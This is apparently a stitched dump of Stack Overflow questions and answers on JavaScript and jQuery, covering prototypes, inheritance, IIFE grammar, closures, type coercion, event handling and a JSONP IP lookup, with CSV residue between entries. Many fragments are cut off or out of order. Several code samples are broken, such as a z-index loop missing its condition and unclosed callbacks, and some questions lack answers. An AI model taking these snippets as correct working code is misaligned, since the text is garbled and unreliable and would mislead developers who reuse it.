<p>This statement is made to iterate over object properties, for Arrays a traditional <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Statements/for"" rel=""nofollow""><code>for</code></a> or <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Statements/while"" rel=""nofollow""><code>while</code></a> loop is recommended.</p>

<p><strong>Why ?</strong> because the <code>for...in</code> statement crawls up the prototype chain as you noticed, also because the order of iteration is arbitrary, iterating over an array may not visit the elements in the numeric order.</p>

<p>However if you still want to iterate using this statement, you can make a check inside the loop, to ensure that the properties you will iterate, are present directly on the object, and not somewhere on the prototype chain, using the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference%3AGlobal%5FObjects%3AObject%3AhasOwnProperty"" rel=""nofollow"">hasOwnProperty</a> function:</p>

","5445","","<p>If you mean by <em>""standard formatted date""</em> a date string in the IETF standard format (i.e.: 'Thu, 15 Oct 2009 12:30:00 GMT') that is acceptable by the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Date/parse"">Date.parse</a> function and by the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Date"">Date</a> constructor, you can parse the date and write a simple helper function to return an ISO8601 date, using a Date object as input:</p>

"<p>Now while I know that you can not perform inheritance like you would in C#, I have seen it mentioned on the Internet that it is kind of possible. If it's not possible using plain JavaScript code then would it be possible using <a href=""http://en.wikipedia.org/wiki/Ext_JS"">Ext&nbsp;JS</a> and if so how?</p>
","5445","","<p>The JavaScript object oriented paradigm is <a href=""http://en.wikipedia.org/wiki/Prototype-based_programming"">prototype based</a>. There are no ""classes"", just objects.</p>

<p>You can implement inheritance in different ways. The two more popular alternatives are the ""pseudo-classical"" and the ""prototypal"" forms. For example:</p>

<h3>Pseudo-classical inheritance</h3>

<p>I think this is the most popular way. You create <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"">constructor functions</a> that you use with the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Operators/Special_Operators/new_Operator"">new</a> operator, and you add members through the constructor function prototype.</p>

<pre><code>// Define the Person constructor function
function Person() {}

Person.prototype.sayHello = function(){
    alert ('hello');
};

// Define the Student constructor function
function Student() {}

// Inherit from Person
Student.prototype = new Person();

// Correct the constructor pointer, because it points to Person
Student.prototype.constructor = Student;

// Replace the sayHello method (a polymorphism example)
Student.prototype.sayHello = function () {
    alert('hi, I am a student');
}

var student1 = new Student();
student1.sayHello();
</code></pre>

<h3><a href=""http://javascript.crockford.com/prototypal.html"">Prototypal inheritance</a></h3>

<p>Basically we make a helper function that takes an object as a parameter and returns an empty new object that inherits from the old one, <em>objects inherit from objects</em>.</p>

<pre><code>// Helper function
if (typeof Object.create !== 'function') {
    Object.create = function (o) {
        function F() {}
        F.prototype = o;
        return new F();
    };
}

var person = {
    sayHello : function () {
        alert('Person object');
    },
    walk : function () {
        alert('walk');
    }
};

var student1 = Object.create(person);
student1.sayHello = function () {
    alert('hello I am a student');
};
</code></pre>

<p>Another interesting form is the <strong>parasitic inheritance</strong>. In the ""derived"" constructor you create a ""base"" object instance. That object is augmented and that new instance is returned: </p>

<pre><code>// Person constructor function
function Person(name) {
    this.name = name;
}

function Student(value) {
    var that = new Person(value);
    that.sayHello = function () {
        alert('hello I am a student');
    };
    return that;
}

"<p>Handling events for several child elements in bubbling phase at parent node is common. However, I am not sure if there are any performance issues in it.

<p>Now If i want to handle onclick on each of the childs, I can attach the handler to each child div or just a single handler to the parent div as the event is going to bubble up.</p>

"<p>Is there a way to specify common elements for object literals in an array?</p>

<p>All three records use the same formatter. How would you refactor this?</p>
","5445","","<p>A pair of alternatives come to my mind:</p>

<p>A helper function with the default value for the common field:</p>

<pre><code>function make(key, label) {
  return {'key': key, 'label': label, formatter:deleteCheckboxFormatter};
}

var array = [ make(""hi"",  ""Hi""),
              make(""hello"", ""Hello""),
              make(""wut"", ""What?"")];
</code></pre>

<p>Or a more <em>generic</em> function that accepts an argument for the formatter property:</p>

<pre><code>function make (formatter) {
  return function (key, label) {
    return {'key': key, 'label': label, 'formatter':formatter};
  }
}

// a function to build objects that will have a 'fooFormatter'
var foo = make('fooFormatter'); 

var array = [ foo (""hi"",  ""Hi""),
              foo (""hello"", ""Hello""),
              foo (""wut"", ""What?"")];
</code></pre>

<p>And the last thing that comes to my mind is simply iterate over the array assigning the common field:</p>

<pre><code>var array = [ {key: ""hi"", label: ""Hi""},
              {key: ""hello"", label: ""Hello""},
              {key: ""wut"", label: ""What?""}];

var i = array.length;
while (i--) {
  array[i].formatter = 'deleteCheckboxFormatter';

","5445","","<p>The prototype object is meant to be used on <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Using_a_Constructor_Function""><em>constructor functions</em></a>, basically functions that will be called using the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Operators/Special_Operators/new_Operator"">new  operator</a> to create new object instances.</p>

<p>Functions in JavaScript are <a href=""http://en.wikipedia.org/wiki/First-class_function"">first-class</a> objects, which means you can add members to them and treat them just like ordinary objects:</p>

};

STORE.item.add = function() { alert('test 123'); };
STORE.item.add();

<p>A typical use of the prototype object as I said before, is when you instantiate an object by calling a constructor function with the new operator, for example:</p>

<pre><code>function SomeObject() {} // a constructor function
SomeObject.prototype.someMethod = function () {};

var obj = new SomeObject();
</code></pre>

<p>All the instances of SomeObject will inherit the members from the <code>SomeObject.prototype</code>, because those members will be accessed through the prototype chain.</p>

<p>Every function in JavaScript has a prototype object because there is no way to know which functions are intended to be used as constructors.</p>

","5445","","<p>You are trying to do some type of what is called in some languages <em>method overloading</em>.</p>

<p>JavaScript doesn't supports it in that way.</p>

<p>JavaScript is very versatile and lets you achieve this kind of feature in different ways.</p>

<p>For your particular example, your <code>add</code> function, I would recommend you to make a function that accepts an arbitrary number of parameters, using the <a href=""https://developer.mozilla.org/En/Core%5FJavaScript%5F1.5%5FReference/Functions%5Fand%5Ffunction%5Fscope/arguments""><code>arguments</code></a> object.</p>

<pre><code>jQuery.extend(jQuery, {
  add: function (/*arg1, arg2, ..., argN*/) {
    var result = 0;

    $.each(arguments, function () {
      result += this;
    });

    return result;
  }
});
</code></pre>

<p>Then you can pass any number of arguments:</p>

<pre><code>alert(jQuery.add(1,2,3,4)); // shows 10
</code></pre>

<p>For more complex method overloading you can detect the number of arguments passed and its types, for example:</p>

<pre><code>function test () {
  if (arguments.length == 2) { // if two arguments passed
    if (typeof arguments[0] == 'string' &amp;&amp; typeof arguments[1] == 'number') {
      // the first argument is a string and the second a number
    }
  }
  //...
}
</code></pre>

<p>Basically bind a click handler to all your links with class <code>toggle</code>, and then when they are clicked, it will look for the next sibling (<em>relative to the clicked link</em>) that is a <code>div</code> with class <code>box</code>, using the <a href=""http://docs.jquery.com/Traversing/next"" rel=""nofollow"">Traversing/next</a> function.</p>

<p>Check the above example with your markup <a href=""http://jsbin.com/uduja"" rel=""nofollow"">here</a>.</p>

<p><strong>Edit:</strong> I reviewed your markup, and your <code>.toggle</code> links are nested inside a <code>div.entry</code> element, also there is an unclosed paragraph, so I've adjusted the code to your markup again:</p>

<pre><code>$(function () { 
  $('div.box').hide(); 
  $('a.toggle').click(function () { 
    $(this).parents('.entry').next('div.box').toggle(400);
  }); 
});
</code></pre>

<p>You will notice that I look for the <code>div.entry</code> element, since the .box are siblings of them.</p>

"<p>How do I hide my javascript/jquery scripts from html page  (from view source on right click)? please give suggestion to achive this .</p>

<p>Thanks.</p>
","5445","","<p>You can't <em>hide</em> the code, JavaScript is interpreted on the browser. The browser must parse and execute the code.</p>

<p>You may want to obfuscate/minify your code.</p>

<p>Recommended resources:</p>

</ul>

<p>Keep in mind, the goal of JavaScript <strong>minification</strong> reduce the code download size by removing comments and unnecessary whitespaces from your code, <strong>obfuscation</strong> also makes minification, but identifier names are changed, making your code much more harder to understand, but at the end obfuscation gives you only a false illusion of privacy.</p>

<a href=""http://schnell.dreamhosters.com/index.php?page=gallery#"" rel=""nofollow"">http://schnell.dreamhosters.com/index.php?page=gallery#</a></p>

<p>I use Firebug to debug my jQuery and other code tidbits and it's been proving very useful for Javascript/jQuery debugging.  However, at the same time, it's been one of the most frustrating debugging experiences I've ever gone through.  I'm not sure why but sometimes it seems like I can copy someone else's methodology from a tutorial, character for character, and yet still come up with errors.  </p>

<p>In any case, the problem here is that Firebug claims there is a bug on line 20 of the source.</p>

<p>missing : after property id
[Break on this error] $('#table').animate({""left: "" + attr + ""px""}, 2000);\n</p>

<p>This bug seems like a huge load to me because the colon <strong>is right there</strong>!  And this is why debugging jQuery/Javascript is such a pain sometimes.  The error messages are rather convoluted and sometimes don't even make a lick of sense to me. Or maybe that's just Firebug.</p>

<p>Either way, the goal I'm going for here is that I'm trying to dynamically change the animate function such that the more you click the left arrow, the further left the grid of images is shifted (due to the nature of the CSS 'left' property).  I have Javascript variables and a hidden input tag to help hold essential values, but the major hurdle is getting the animate function to recognize these variables.  Near as I can tell it will only accept string literals for arguments on how to animate and the documentation doesn't help me because it doesn't discuss the use of variables with animate, as if it's impossible.  </p>

<p>Well, let's just say I don't like impossible, he likes to get in my way a lot.</p>
","5445","","<p>The object literal passed to the animate function is not well formed, it should be:</p>

<pre><code>$('#table').animate({left: attr + ""px""}, 2000);
</code></pre>

<p><strong>Edit</strong>: Looking closely to your code, you are also trying to get a value from an input with id = ""count"", and you have a missing # character to have an ID selector:</p>

<pre><code>var count = +$('#count').val(); // get #count value as Number
</code></pre>

<p>You are also incrementing this <code>count</code> variable, but you should first convert it to Number, because  the <code>value</code> attribute of <code>input</code> elements are string. (<em>I did it using the unary plus operator on the right-hand side of the assignment</em>).</p>

<p>You have to convert it to a number, because if you <em>add</em> two variables and one of them is a string, concatenation will take place:</p>

<pre><code> ""1"" + 1 == ""11""
</code></pre>
"
"<p>Google optimizer includes the following snippet as part of their conversion code.  Unfortunately, the CMS we're using automatically converts the single quotes to ASCII (&amp; #39;).

"<h2>Summary</h2>

<p>Can you explain the reasoning behind the syntax for encapsulated anonymous functions in JavaScript? Why does this work: <code>(function(){})();</code> but this doesn't: <code>function(){}();</code>?</p>

<p><hr /></p>

<h2>What I know</h2>

<p>In JavaScript, one creates a named function like this:</p>

<pre><code>function twoPlusTwo(){
    alert(2 + 2);
}
twoPlusTwo();
</code></pre>

<p>You can also create an anonymous function and assign it to a variable:</p>

<pre><code>var twoPlusTwo = function(){
    alert(2 + 2);
};
twoPlusTwo();
</code></pre>

<p>You can encapsulate a block of code by creating an anonymous function, then wrapping it in brackets and executing it immediately:</p>

<pre><code>(function(){
    alert(2 + 2);
})();
</code></pre>

<p>This is useful when creating modularised scripts, to avoid cluttering up the current scope, or global scope, with potentially conflicting variables - as in the case of Greasemonkey scripts, jQuery plugins, etc.</p>

<p>Now, I understand why this works. The brackets enclose the contents and expose only the outcome (I'm sure there's a better way to describe that), such as with <code>(2 + 2) === 4</code>.</p>

<p><hr /></p>

<h2>What I don't understand</h2>

<p>But I don't understand why this does not work equally as well:</p>

<pre><code>function(){
    alert(2 + 2);
}();
</code></pre>

<p>Can you explain that to me?</p>
","5445","","<p>It doesn't work because it is being parsed as a <strong><code>FunctionDeclaration</code></strong>, and the name identifier of function declarations is a <em>mandatory</em>.</p>

<p>When you surround it with parentheses it is evaluated as a <strong><code>FunctionExpression</code></strong>, and function expressions can be named or not.</p>

<p>The grammar of a <code>FunctionDeclaration</code> looks like this:</p>

<pre><code>FunctionDeclaration :
function Identifier ( FormalParameterListopt ) {FunctionBody}
</code></pre>

<p>And the one of <code>FunctionExpression</code>s:</p>

<pre>
    FunctionExpression :
    function Identifier<strong>opt</strong> (FormalParameterListopt) {FunctionBody}
</pre>

<p>As you can see the <code>Identifier</code> token in <code>FunctionExpression</code>s is optional, therefore we can have a function expression without a name defined:</p>

<pre><code>(function () {
    alert(2 + 2);
}());
</code></pre>

<p>Or <em>named</em> function expression:</p>

<pre><code>(function foo() {
    alert(2 + 2);
}());
</code></pre>

<p>The Parentheses (formally called <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.1.6"">the Grouping Operator</a>) can surround only expressions, and a function expression is evaluated.</p>

<p>The two grammar productions can be ambiguous, and they can look exactly the same, for example:</p>

<pre><code>function foo () {} // FunctionDeclaration

0,function foo () {} // FunctionExpression
</code></pre>

<p>The parser knows if it's a <code>FunctionDeclaration</code> or a <code>FunctionExpression</code>, depending on the <strong>context</strong> where it appears.</p>

<p>In the above example, the second one is an expression because the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.14"">Comma operator</a> can also handle only expressions.</p>

<p>On the other hand, <code>FunctionDeclaration</code>'s could actually appear only in what's called ""<code>Program</code>"" code, meaning code outside in the global scope, and inside the <code>FunctionBody</code> of other functions.</p>

<p>Functions inside blocks should be avoided, because they can lead an unpredictable behavior, e.g.:</p>

<pre><code>if (true) {
  function foo () { alert('true'); }
} else {
  function foo () { alert('false!'); }
}

foo(); // true? false? why?
</code></pre>

<p>The above code should actually produce a <code>SyntaxError</code>, since a <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_12.1""><code>Block</code></a> such those can only contain statements (and the ECMAScript Specification doesn't define any function statement), but most implementations are tolerant, and will simply take the second function, the one which alerts <code>'false!'</code>.</p>

<p>The Mozilla implementations -Rhino, SpiderMonkey,- have a different behavior. Their grammar contains a <em>non-standard</em> Function Statement, meaning that the function will be evaluated at <em>run-time</em>, not at parse time, as it happens with <code>FunctionDeclaration</code>s. In those implementations we will get the first function defined.</p>

<hr>

<p>Functions can be declared in different ways, <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Functions#Function_constructor_vs._function_declaration_vs._function_expression"">compare the following</a>:</p>

<p>1- A function defined with the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Function"">Function</a> constructor assigned to the variable <em>multiply</em>:</p>

<pre><code>  var multiply = new Function(""x"", ""y"", ""return x * y;"");
</code></pre>

<p>2- A function declaration of a function named <em>multiply</em>:</p>

<pre><code>  function multiply(x, y) {
     return x * y;
  }
</code></pre>

<p>3- A function expression assigned to the variable <em>multiply</em>:</p>

<pre><code>  var multiply = function (x, y) {
     return x * y;
  };
</code></pre>

<p>4- A named function expression *func_name*, assigned to the variable <em>multiply</em>:</p>

<p>Is it okay to think of the first statement as a declaration of a static method, and the second statement as a declaration of an instance method?</p>
","5445","","<p>Yes, the first function has no relationship with an object instance of that <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FGuide/Creating%5FNew%5FObjects/Using%5Fa%5FConstructor%5FFunction"">constructor function</a>, you can consider it like a <em>'static method'</em>.</p>

<p>In JavaScript functions are <a href=""http://en.wikipedia.org/wiki/First-class%5Ffunction""><em>first-class</em></a> objects, that means you can treat them just like any object, in this case, you are only adding a property to the <em>function object</em>.</p>

<p>The second function, as you are extending the constructor function prototype, it will be available to all the object instances created with the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Operators/Special%5FOperators/new%5FOperator""><code>new</code></a> keyword, and the context within that function (the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Operators/Special%5FOperators/this%5FOperator""><code>this</code></a> keyword) will refer to the actual object instance where you call it.</p>

<p>Consider this example:</p>

<pre><code>// constructor function
function MyClass () {
  var privateVariable; // private member only available within the constructor fn

  this.privilegedMethod = function () { // it can access private members
    //..
  };
}

// A 'static method', it's just like a normal function 
// it has no relation with any 'MyClass' object instance
MyClass.staticMethod = function () {};

MyClass.prototype.publicMethod = function () {
  // the 'this' keyword refers to the object instance
  // you can access only 'privileged' and 'public' members
};

var myObj = new MyClass(); // new object instance

myObj.publicMethod();

<p>which I am not sure is even close.  Can someone help guide me through this, please?</p>
","5445","","<p>I see a couple of things that are not working in your script:</p>

<ul>
<li><p>The <code>year</code> variable is not used and there is no <code>year</code> input in your form.</p></li>
<li><p>The <code>a</code>, <code>b</code> and <code>c</code> variable declaration, I think that you want to get the values from your input elements.</p></li>
<li><p>You assign the calculation to the <code>productTotal</code> variable, and later you use the undefined <code>theProductTotal</code> variable.</p></li>
</ul>

<p>To get the form elements by <code>name</code> I would recommend you something like this:</p>

<pre><code>function update() {
  var a = +document.forms['calc'].elements['productOne'].value,
      b = +document.forms['calc'].elements['productTwo'].value,
      c = +document.forms['calc'].elements['productThree'].value,
      productTotal = Math.floor(a/(a+b+c)*300);

  document.forms['calc'].elements['productTotal'].value = productTotal;

  return false;
}
</code></pre>

<p>Notice how I'm getting the input values, since you are using only the <code>name</code> attribute, you can access the elements in that way.</p>

<p>Also look that I'm converting the input values to Number (by using the unary plus operator), since the <code>value</code> property is string, and that can give you problems when you sum, because if you use the add operator with strings a concatenation will take place.</p>

"<p>I want to know how to get client IP address using jQuery?</p>

<p>Is it possible? I know pure javascript can't, but got some code using <code>JSONP</code> from Stack Overflow itself.</p>

<p>So, is there any workaround using jQuery?</p>
","5445","","<p>jQuery can handle JSONP, just pass an url formatted with the callback=? paramtere to the $.getJSON method, for example:</p>

<pre><code> $.getJSON(""http://jsonip.appspot.com?callback=?"",
    function(data){
       alert( ""Your ip: "" + data.ip);

<p>Check the source of the service, is a small Python script, it can be implemented on any server-side language.</p>

<p>If you aren't looking for a cross-domain solution the script can be simplified even more, since you don't need the callback parameter, and you return pure JSON.</p>

"<p>Just a quick question... I currently have the following jQuery code with a selector in it.</p>

<pre><code>var ID = ""idControl""
function doesTreeViewExist()
{
    if($('#' + ID).length == 0)
    {
        return false;
    }
    else
    {
        return true;
    }

<p>I was wondering how do I write the test to test the selector using QUnit?  More specifically, I'm having trouble coming up with the syntax/code.</p>

<p>EDIT:</p>

<p>Ok, suppose now I want to mock the selector call instead because I cannot get access to the actual website.  I'm using JsTestDriver as my testing tool, which means I cannot touch the browser the tests are running in (else the test runs will stop).  What about in such situation?  How can I possibly test the code?</p>

<p>Thanks.</p>
","5445","","<p>The function you post, can be heavily simplified:</p>

<pre><code>var ID = ""idControl"";
function doesTreeViewExist() {
  return !!$('#' + ID).length;
}
</code></pre>

<p>Using the <code>!!</code> construct (<em>double bitwise NOT</em>), to convert the <code>length</code> property to Boolean, it will return <code>false</code> only when length is zero.</p>

<p>Speaking about qUnit, you can easily setup a simple test like this:</p>

<pre><code>test(""Your selector test"", function() {
  ok($('#idControl').length &gt; 0, ""idControl exists"");
  // or simply
  ok($('#idControl').length, ""idControl exists"");
});

"<p>How can I update a variable outside of a function? For example I have this:</p>

<pre><code>        var max_index = 0;

        if($(this).attr(""z-index"") &gt; max_index){
            max_index = $(this).attr(""z-index"") + 1;
        }
    });

    alert(max_index);
</code></pre>

<p>The only problem with this is that <code>max_index</code> is always alerting <code>0</code>. How can I have that update the <code>max_index</code>?</p>
","5445","","<p>Yes, you can update the variable, it's accessible from the outer <a href=""http://www.jibbering.com/faq/faq%5Fnotes/closures.html"" rel=""nofollow"">closure</a>, the problem is that <em><code>z-index</code> is not an attribute</em>, it is a <strong>CSS</strong> property, you can get it using the jQuery <a href=""http://docs.jquery.com/CSS"" rel=""nofollow"">css</a> function:</p>

<pre><code>    var max_index = 0;

    //loop through the z-index's
    $("".widget_container"").each(function(){

        max_index = +$(this).css('zIndex') + 1;
      }
    });

    alert(max_index);
</code></pre>

<p>Notice that I use a plus sign before the addition, that is the unary plus operator, it converts the <code>zIndex</code> value to number, since this function returns strings, and if one of the operands of the <code>+</code> operator is a string, a concatenation is done ( <code>""0"" + 1 = ""01""</code> ).</p>

<p>Also note that the CSS properties that contain dashes, like <code>background-color</code> or <code>font-size</code>, are accessed removing the dash, and capitalizing the next word.</p>

// or

","5445","","<p>That is happening because you are using the <code>keyCode</code> member, for example, a lower case 'a' and an upper case 'A' have the same keyCode, because is the same key, but a different charCode because the resulting character is different.</p>

<p>This works. The second way, recommended by the very able Mr. Lindley, puts my new function in the jQuery namespace. His basic recommended construct may be seen <a href=""http://jsbin.com/ixubi/edit/#html"" rel=""nofollow"">here</a>. This helps me ""avoid creating global code that could potentially create conflicts."" Here's the code for my function following these recommendations:</p>

<pre><code>(function($){
    $.enable_or_disable_by_selection = function(master_id, master_id_value, dependent_ids){
    /*
     * The master_id argument is the id attribute string of the master select element in the form
     * ""#id_select_element_name"".
     * The master_id_value argument is the selection value, a string, that causes the dependent
     * elements to be enabled when it is selected. In all other cases, they are disabled.
     * The dependent_ids argument is an array of dependent id attribute strings, such as
     * [""#id_element_1"", ""#id_element_2"", ""#id_element_3""]
     */

    /* CHANGE OF master_id SELECTION ELEMENT: */
        $(master_id).change(function() {
            /* If master_id_value is chosen, enable inputs for elements in dependent_ids: */
            if ($(master_id).val() == master_id_value) {
                for (var i = 0; i &lt; dependent_ids.length; i++) {
                    $(dependent_ids[i]).removeAttr(""disabled"");
                }
            }
            /* Otherwise disable inputs for elements in dependent_ids: */
            else {
                for (var i = 0; i &lt; dependent_ids.length; i++) {
                    $(dependent_ids[i]).attr(""disabled"", true);
                }
            }
        });
    };
})(jQuery);
</code></pre>

<p>This works too. It's the same logic wrapped up in jQuery.</p>

<p>I know that jQuery makes use of anonymous functions and closures in order to maintain a hermetic namespace. See ""Using (function(){})()"" by John Resig, <a href=""http://ajaxian.com/downloads/books/javascriptninja/JavaScriptNinja%5Fch3%5FArticle2.pdf"" rel=""nofollow"">here</a>. But, as I study these two snippets, I am having a hard time seeing the risk in the first, simpler version. Also, am I wrong in thinking that this second method is a bit slower? Please help me see the advantages in the second version. I want to know why this is done.</p>

<p>Useful observations not pertinent to the question are always welcome.</p>
","5445","","<p>1 - The <em>risk</em> on your first version comes with the fact that your function is global, for example, some other random library is added to your page, and it overrides your function, it will have disastrous effects with the rest of the API of your widget. </p>

<p>I think you want to create redistributable widgets, and you must be defensive with your code, keeping as much your of your library code private as possible and you should be very selective and careful when you introduce global objects.</p>

<p>2 - The second example is not more <em>slower</em>, you are simply adding a member to the jQuery object, the time of name resolution of the property is really insignificant.</p>

"<p>I have what I thought was a relatively easy Ajax/animation that I'm adding to a client site to select between projects for display as images.  The flow goes something like this:</p>

<ol>
<li>User clicks on a thumbnail in a project overview (pHome).</li>
<li>Using jQuery, ajax load in an XML file with the image, caption and project description data (project1).</li>
<li>Construct the HTML from the XML file and inject it into the DOM (div id=""project1"").</li>
<li>Animate and (4.5) fade out pHome.</li>
<li>Fade in project1.</li>
<li>Add a 'puff' effect to the thumbnail that brought the user to the project.</li>
</ol>

<p>All of these things need to happen synchronously, but I can't find the right flow for the functions.  Attaching all of these steps to the user click fades out pHome before the animation completes, and the 'puff' effect fires before the project1 div is even visible.</p>

<p>As it is, I have functions for all of these steps, and it seems like a real mess.  What I'm asking for is some best-practice way of structuring these functions so they all happen synchronously (with the possible exception of 2 &amp; 3).  Just as an aid, here's the pseudocode for my problem:</p>

<pre><code>$('#thumbnail').live('click', function(){
    loadXML(thumbnail_id);

    $('project1').fadeIn();
    $('thumbnail_id').puff();

","5445","","<p>I would recommend you to make a callback function parameter in your <code>loadXML</code> function, for being able to execute the <code>makeHTML</code> function and your effects when the XML data is loaded from the server.</p>

<pre><code>$('#thumbnail').live('click', function(){

"<p>How do I trigger something when the cursor is within TEXTAREA and Ctrl+Enter is pressed? Using jQuery. Thanks</p>
","5445","","<p>You can use the <a href=""https://developer.mozilla.org/En/DOM/Event.ctrlKey""><code>event.ctrlKey</code></a> flag to see if the <kbd>Ctrl</kbd> key is pressed, something like this:</p>

"<p>I have a form setup so that when you check a checkbox, the relevant UL will expand showing more options based on the choice. It works, but only when the user clicks the label of the checkbox. If the checkbox is clicked, the UL expands as expected, but the box doesn't get checked.</p>

<p>Javascript:</p>

<pre><code>  jQuery(document).ready(function()
  {
     jQuery('.toggleUL').click(function()
     {
        var checkbox = jQuery(this).find('input');
        var ul       = jQuery(this).next('ul');

        if (ul.css('display') == 'block') { ul.find('input').attr('checked', false); }

        if (checkbox.attr('checked') == false)
        {
           checkbox.attr('checked', true);
        }
        else
        {
           checkbox.attr('checked', false);
        }


        ul.slideToggle('slow'); return false;
     });
  });
</code></pre>

<p>HTML:</p>

<pre><code>       &lt;label class=""toggleUL""&gt;&lt;input style=""margin-right: 10px"" type=""checkbox"" name=""quoteWebsite"" id=""quoteWebsite"" value=""xxx"" /&gt;xxx&lt;/label&gt;
       &lt;ul style=""list-style-type: none; display: none""&gt;
          &lt;li style=""margin-left: 20px""&gt;&lt;label&gt;&lt;input style=""margin-right: 10px"" type=""checkbox"" name=""quoteWebsite1[]"" id=""quoteWebsite1"" value=""xxx"" /&gt;xxx&lt;/label&gt;&lt;/li&gt;
          &lt;li style=""margin-left: 20px""&gt;&lt;label&gt;&lt;input style=""margin-right: 10px"" type=""checkbox"" name=""quoteWebsite1[]"" id=""quoteWebsite2"" value=""xxx"" /&gt;xxx&lt;/label&gt;&lt;/li&gt;
          &lt;li style=""margin-left: 20px""&gt;&lt;label&gt;&lt;input style=""margin-right: 10px"" type=""checkbox"" name=""quoteWebsite1[]"" id=""quoteWebsite3"" value=""xxx"" /&gt;xxx&lt;/label&gt;&lt;/li&gt;
       &lt;/ul&gt;
</code></pre>

<p>The slideToggle() function wasn't working the way it should. When the box/label was clicked, the UL would expand then retract instantly. The only way I could get it to stop was to add 'return false;' which, of course, causes the checkbox not to check. Hence the checkbox.attr().</p>

<p>Hacked up code, I know. But how can I get the checkbox to work? >.&lt;</p>
","5445","","<p>I would suggest you to attach the click event directly to the checkbox, and use the <a href=""http://www.w3.org/TR/html401/interact/forms.html#adef-for"" rel=""nofollow""><code>for</code></a> attribute on the <code>label</code> element to associate it with the checkbox:</p>

<pre><code>&lt;input type=""checkbox"" name=""quoteWebsite"" id=""quoteWebsite"" value=""xxx"" /&gt;
&lt;label for=""quoteWebsite""&gt;xxx&lt;/label&gt;
</code></pre>

<p>I simplified your code: </p>

<pre><code>jQuery(function () {
     jQuery('#quoteWebsite').click(function() {
        var checkbox = jQuery(this),
            ul = jQuery(this).siblings('ul');

        if (ul.css('display') == 'block') {
          ul.find('input').attr('checked', false);
        }

        ul.slideToggle('slow');
     });
});
</code></pre>

<p>What's the need for this sort of coding? Is this more efficient or just a shortened version with the same efficiency?</p>
","5445","","<p>It is the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FGuide/Operators/Special%5FOperators"">conditional</a> operator, it is equivalent to something like this:</p>

<pre><code>if (pattern.Gotoccurance.score != null) {
  pattern.Gotoccurance.score;
} else {
  '0';
}

<p>But I think that an assignment statement is missing in the code you posted, like this:</p>

<pre><code>var score = pattern.Gotoccurance.score !=null ? pattern.Gotoccurance.score : '0';
</code></pre>

<p>The <code>score</code> variable will be assigned if <code>pattern.Gotoccurance.score</code> is not null:</p>

<pre><code>var score;
if (pattern.Gotoccurance.score != null) {
  score = pattern.Gotoccurance.score;
} else {
  score = '0';
}
</code></pre>

<p>A common pattern to do this kind of 'default value' assignments in JavaScript is to use the logical OR operator (<code>||</code>) :</p>

<pre><code>var score = pattern.Gotoccurance.score ||  '0';
</code></pre>

<p>The value of <code>pattern.Gotoccurance.score</code> will be assigned to the <code>score</code> variable only if that value is not <em>falsy</em> (falsy values are <code>false</code>, <code>null</code>, <code>undefined</code>, <code>0</code>, zero-length string or <code>NaN</code>).</p>

<p>Otherwise, if it's falsy <code>'0'</code> will be assigned.</p>

<p><strong>Update:</strong> The performance will be equivalent, you should focus on readability, I try to use the ternary operator on expressions that are very simple, and you can also improve the formatting, splitting it up in two lines to make it more readable:</p>

<p><strong>10.1.8 Arguments Object</strong></p>

<p>When control enters an execution context for function code, an arguments object is created and
initialised as follows:</p>

<ul>
<li><p>The value of the internal <code>[[Prototype]]</code> property of the arguments object is the original Object prototype object, the one that is the initial value of <code>Object.prototype</code> (see 15.2.3.1).</p></li>
<li><p>A property is created with name <code>callee</code> and property attributes <code>{ DontEnum }</code>. The initial value of this property is the Function object being executed. This allows anonymous functions to be recursive.</p></li>
<li><p>A property is created with name <code>length</code> and property attributes <code>{ DontEnum }</code>. The initial value of this property is the number of actual parameter values supplied by the caller.</p></li>
<li><p>For each non-negative integer, <code>arg</code>, less than the value of the <code>length</code> property, a property is created with name <code>ToString(arg)</code> and property attributes <code>{ DontEnum }</code>. The initial value of this property is the value of the corresponding actual parameter supplied by the caller. The first actual parameter value corresponds to <code>arg = 0</code>, the second to <code>arg = 1</code>, and so on. In the case when <code>arg</code> is less than the number of formal parameters for the <code>Function</code> object, this property shares its value with the corresponding property of the activation object. This means that changing this property changes the corresponding property of the activation object and vice versa.</p></li>

Actually, onload causes 'door #2'.  Note that it will do this whether the first declaration of <code>testprint</code> is included or not.</p>

<p>The third and fourth declaration of <code>testprint</code> use different means of assigning the function, I tried this to see if it would override <code>window.onload</code>'s behavior in the same was the second declaration of <code>testprint</code> does.  It did not.  Note that if I move the fourth declaration of <code>testprint</code> to the end of the first script block it would be called by <code>window.onload</code>.</p>

function foo () { alert('foo');}
foo(); // alerts bar

","5445","","<p>Since you are using the  <code>each</code> method to loop over your elements, you should use the <code>this</code> keyword inside the callback function, to refer to the currently iterated element:</p>

<pre><code>$(""img"").each(function (i) {
    var image = $(this), // 'this' is the image element being iterated
        originalSrc = image.attr('src');

    image.attr('src', 'http://www.domain-name.com/' + originalSrc);

"<p>First of all,check out this image<br>
<img src=""http://ssl.gstatic.com/ui/v1/icons/mail/im/emotisprites/wink2.png"" alt=""wink""><br>
Gmail uses this image to display the animated emoticon.<br>
How can we show such animation using a png image?</p>
","5445","","<p>I leave you a rough <a href=""http://jsbin.com/otelu"">example</a> so you can get an starting point:</p>

